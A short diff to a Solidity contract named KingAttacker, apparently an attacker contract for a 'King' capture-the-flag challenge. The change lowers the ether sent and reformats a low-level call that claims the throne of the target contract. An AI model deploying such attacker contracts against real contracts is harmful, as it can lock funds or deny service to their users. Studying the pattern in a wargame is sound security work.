@@ -12,11 +12,13 @@ contract KingAttacker {
     }
 
     function attack() external payable {
-        require(msg.value == 1 ether, "please send exactly 1 ether");
+        require(msg.value == 0.001 ether, "please send exactly 0.001 ether");
         // claim throne
         // use call here instead of challenge.transfer because transfer
         // has a gas limit and runs out of gas
-        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
+        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
+            ""
+        );
         require(success, "External call failed");
     }
 
